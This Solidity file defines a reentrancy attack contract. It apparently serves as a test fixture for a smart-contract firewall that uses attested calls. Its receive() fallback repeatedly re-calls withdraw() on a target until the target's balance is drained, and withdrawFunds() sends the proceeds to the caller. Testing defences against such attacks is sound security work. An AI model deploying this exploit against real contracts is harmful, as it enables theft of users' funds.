// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrancyVulnerable {
    function deposit() external payable;
    function withdraw() external;
}

struct Attestation {
    /// @notice Deadline UNIX timestamp
    uint256 deadline;
    /**
     * @notice Ordered hashes which should be produced at every checkpoint execution
     * in this contract. An attester uses these hashes to enable a specific execution
     * path.
     */
    bytes32[] executionHashes;
}

interface IFirewall {
        function attestedCall(Attestation calldata attestation, bytes calldata attestationSignature, bytes calldata data) external;
}

contract ReentrancyAttack {
    address public vulnerableContract;
    // Boolean used so that `receive()` only
    // reenters `ReentrancyVulnerable` when
    // we are attacking it.
    bool public benignWithdraw;

    error WithdrawFundsFailed(address recipient);

    constructor(address _vulnerableContract) {
        vulnerableContract = _vulnerableContract;
        benignWithdraw = true;
    }

    receive() external payable {
        if(!benignWithdraw) {
            while (vulnerableContract.balance > 0) {
                IReentrancyVulnerable(vulnerableContract).withdraw();
            }
        }
    }

    function deposit() public payable {
        require(msg.value >= 1 ether);
        IReentrancyVulnerable(vulnerableContract).deposit{value: msg.value}();
    }

    function withdraw() public {
        benignWithdraw = true;
        IReentrancyVulnerable(vulnerableContract).withdraw();
    }

    function withdrawWithAttestation(Attestation calldata attestation, bytes calldata attestationSignature) public {
        benignWithdraw = true;

        bytes memory data = abi.encodeWithSelector(IReentrancyVulnerable.withdraw.selector);
        IFirewall(vulnerableContract).attestedCall(attestation, attestationSignature, data);
    }

    function attack() public payable {
        require(msg.value >= 1 ether);
        benignWithdraw = false;

        IReentrancyVulnerable(vulnerableContract).deposit{value: msg.value}();
        IReentrancyVulnerable(vulnerableContract).withdraw();

        // Needed for a newer version of model
        // selfdestruct(payable(msg.sender));
    }

    function attackWithAttestation(Attestation calldata attestation, bytes calldata attestationSignature) public payable {
        require(msg.value >= 1 ether);
        benignWithdraw = false;

        IReentrancyVulnerable(vulnerableContract).deposit{value: msg.value}();
        bytes memory data = abi.encodeWithSelector(IReentrancyVulnerable.withdraw.selector);
        IFirewall(vulnerableContract).attestedCall(attestation, attestationSignature, data);
    }

    function withdrawFunds() public {
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "WithdrawFunds failed.");
    }
}